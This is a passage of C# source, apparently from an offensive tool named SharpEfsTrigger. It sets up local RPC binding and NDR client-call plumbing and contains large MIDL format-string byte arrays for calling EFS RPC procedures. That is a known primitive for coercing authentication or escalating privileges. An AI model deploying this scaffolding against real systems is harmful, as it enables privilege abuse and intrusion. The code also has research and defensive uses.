                                                                clientinterface.AddrOfPinnedObject(),
                                                                Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                                Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }

            protected void freeStub()
            {
                procString.Free();
                faultoffsets.Free();
                clientinterface.Free();
                formatString.Free();
                stub.Free();
            }

            private delegate IntPtr allocmemory(int size);

            protected static IntPtr AllocateMemory(int size)
            {
                IntPtr memory = Marshal.AllocHGlobal(size);
                return memory;
            }

            private delegate void freememory(IntPtr memory);

            protected static void FreeMemory(IntPtr memory)
            {
                Marshal.FreeHGlobal(memory);
            }

            //https://github.com/vletoux/pingcastle/blob/19a3890b214bff7cb66b08c55bb4983ca21c8bd1/RPC/rpcapi.cs#L224
            protected IntPtr Bind(IntPtr IntPtrserver, bool UseNullSession = false, string interfaceid = null)
            {
                string server = Marshal.PtrToStringUni(IntPtrserver);
                IntPtr bindingstring = IntPtr.Zero;
                IntPtr binding = IntPtr.Zero;
                Int32 status;

                //status = RpcStringBindingCompose(interfaceid, "ncacn_np", server, PipeName, null, out bindingstring);
                status = NativeMethods.RpcStringBindingCompose(interfaceid, "ncalrpc", null, null, null, out bindingstring);
                if (status != 0)
                {
                    Console.WriteLine("[x]RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                    return IntPtr.Zero;
                }

                Console.WriteLine(Marshal.PtrToStringUni(bindingstring));

                status = NativeMethods.RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
                NativeMethods.RpcBindingFree(ref bindingstring);
                if (status != 0)
                {
                    Console.WriteLine("[x]RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                    return IntPtr.Zero;
                }

                status = NativeMethods.RpcBindingSetAuthInfo(binding, server, 6, 9, IntPtr.Zero, 0);
                if (status != 0)
                {
                    Console.WriteLine("[x]RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
                }

                status = NativeMethods.RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
                if (status != 0)
                {
                    Console.WriteLine("[x]RpcBindingSetOption failed with status 0x" + status.ToString("x"));
                }
                //Console.WriteLine("[!]binding ok (handle=" + binding.ToString("x") + ")");

                return binding;
            }

            protected IntPtr GetProcStringHandle(int offset)
            {
                return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
            }

            protected IntPtr GetStubHandle()
            {
                return stub.AddrOfPinnedObject();
            }

            protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
            {
                GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
                IntPtr result;
                try
                {
                    result = NativeMethods.NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
                }
                finally
                {
                    stackhandle.Free();
                }
                return result;
            }
        }
    }


    namespace SharpEfsTrigger

    {
        public class efs : efsapi
        {
            private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x30, 0x41, 0x00, 0x00, 0x11, 0x04, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x00, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xe1, 0x00, 0x00, 0x11, 0x14, 0x02, 0x00, 0x12, 0x00, 0xa8, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0x1d, 0x00, 0x06, 0x00, 0x01, 0x5b, 0x15, 0x00, 0x06, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x1b, 0x03, 0x04, 0x00, 0x04, 0x00, 0xf9, 0xff, 0x01, 0x00, 0x08, 0x5b, 0x17, 0x03, 0x08, 0x00, 0xf0, 0xff, 0x02, 0x02, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x36, 0x5b, 0x12, 0x00, 0xe4, 0xff, 0x16, 0x03, 0x10, 0x00, 0x4b, 0x5c, 0x46, 0x5c, 0x04, 0x00, 0x04, 0x00, 0x12, 0x00, 0xbc, 0xff, 0x46, 0x5c, 0x08, 0x00, 0x08, 0x00, 0x12, 0x00, 0xd6, 0xff, 0x46, 0x5c, 0x0c, 0x00, 0x0c, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x5b, 0x08, 0x08, 0x08, 0x08, 0x5b, 0x1b, 0x03, 0x04, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x4b, 0x5c, 0x48, 0x49, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0xbc, 0xff, 0x5b, 0x08, 0x5c, 0x5b, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x00, 0x50, 0xff, 0x36, 0x5b, 0x12, 0x00, 0xd0, 0xff, 0x11, 0x00, 0xec, 0xff, 0x11, 0x00, 0x76, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x04, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x0c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x4c, 0x00, 0xdf, 0xff, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xe2, 0xff, 0x16, 0x03, 0x0c, 0x00, 0x4b, 0x5c, 0x46, 0x5c, 0x04, 0x00, 0x04, 0x00, 0x12, 0x00, 0x24, 0xff, 0x46, 0x5c, 0x08, 0x00, 0x08, 0x00, 0x12, 0x00, 0xd4, 0xff, 0x5b, 0x08, 0x08, 0x08, 0x5c, 0x5b, 0x1b, 0x03, 0x04, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x4b, 0x5c, 0x48, 0x49, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0xc6, 0xff, 0x5b, 0x08, 0x5c, 0x5b, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x00, 0x82, 0xff, 0x36, 0x5b, 0x12, 0x00, 0xd0, 0xff, 0x12, 0x00, 0x0c, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x04, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x00, 0xec, 0xff, 0x36, 0x5b, 0x12, 0x00, 0xda, 0xfe, 0x11, 0x14, 0xde, 0xff, 0x11, 0x00, 0xe8, 0xff, 0x12, 0x00, 0x02, 0x00, 0x16, 0x03, 0x10, 0x00, 0x4b, 0x5c, 0x46, 0x5c, 0x04, 0x00, 0x04, 0x00, 0x12, 0x00, 0x26, 0xff, 0x46, 0x5c, 0x08, 0x00, 0x08, 0x00, 0x12, 0x00, 0x6a, 0xff, 0x46, 0x5c, 0x0c, 0x00, 0x0c, 0x00, 0x12, 0x00, 0xc0, 0xff, 0x5b, 0x08, 0x08, 0x08, 0x08, 0x5b, 0x12, 0x08, 0x25, 0x5c };
            private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x04, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0c, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x14, 0x41, 0x04, 0x00, 0x18, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0c, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x0c, 0x01, 0x04, 0x00, 0x26, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x04, 0x00, 0x30, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x38, 0x00, 0x40, 0x01, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x32, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x03, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x70, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x08, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x08, 0x00, 0x36, 0x00, 0x70, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x08, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x08, 0x00, 0x36, 0x00, 0x70, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x08, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x08, 0x00, 0xe4, 0x00, 0x70, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x08, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x72, 0x01, 0x70, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x04, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x08, 0x00, 0x46, 0x07, 0x08, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x14, 0x00, 0x84, 0x01, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x1c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x14, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x04, 0x08, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x13, 0x20, 0x0c, 0x00, 0xa4, 0x01, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x08, 0x00, 0x46, 0x07, 0x08, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x14, 0x00, 0x84, 0x01, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x1c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x04, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x05, 0x08, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x00, 0x04, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x84, 0x01, 0x0b, 0x01, 0x0c, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x72, 0x01, 0x70, 0x00, 0x14, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x1c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x10, 0x00, 0x08, 0x00, 0x47, 0x06, 0x08, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x00, 0x04, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x84, 0x01, 0x0b, 0x01, 0x0c, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x13, 0x20, 0x14, 0x00, 0xa4, 0x01, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x04, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x08, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x08, 0x00, 0xa4, 0x01, 0x70, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x05, 0x08, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x84, 0x01, 0x0b, 0x01, 0x0c, 0x00, 0x92, 0x01, 0x0b, 0x00, 0x10, 0x00, 0xac, 0x01, 0x70, 0x00, 0x14, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x44, 0x01, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x04, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x14, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x0b, 0x00, 0x08, 0x00, 0xda, 0x01, 0x48, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };
            private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x30, 0x41, 0x00, 0x00, 0x11, 0x04, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x00, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xe1, 0x00, 0x00, 0x11, 0x14, 0x02, 0x00, 0x12, 0x00, 0x90, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0x1d, 0x00, 0x06, 0x00, 0x01, 0x5b, 0x15, 0x00, 0x06, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x1b, 0x03, 0x04, 0x00, 0x04, 0x00, 0xf9, 0xff, 0x01, 0x00, 0x08, 0x5b, 0x17, 0x03, 0x08, 0x00, 0xf0, 0xff, 0x02, 0x02, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xe2, 0xff, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x00, 0xb8, 0xff, 0x12, 0x00, 0xd8, 0xff, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x12, 0x00, 0xd4, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0x68, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0x11, 0x00, 0xea, 0xff, 0x11, 0x00, 0x62, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x04, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x4c, 0x00, 0xdf, 0xff, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xe2, 0xff, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x38, 0xff, 0x12, 0x00, 0xd8, 0xff, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x12, 0x00, 0xd8, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0x96, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xd8, 0xff, 0x12, 0x00, 0x0c, 0x00, 0xb7, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x04, 0x00, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xec, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x00, 0xff, 0x11, 0x14, 0xdc, 0xff, 0x11, 0x00, 0xe6, 0xff, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x00, 0x32, 0xff, 0x12, 0x00, 0x7e, 0xff, 0x12, 0x00, 0xc8, 0xff, 0x12, 0x08, 0x25, 0x5c };
            private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x08, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x14, 0x41, 0x08, 0x00, 0x18, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x0c, 0x01, 0x08, 0x00, 0x26, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x08, 0x00, 0x30, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x38, 0x00, 0x40, 0x01, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x32, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x36, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x36, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0xcc, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x48, 0x01, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x08, 0x00, 0x46, 0x07, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x28, 0x00, 0x5c, 0x01, 0x48, 0x00, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x04, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x13, 0x20, 0x18, 0x00, 0x7e, 0x01, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x08, 0x00, 0x46, 0x07, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 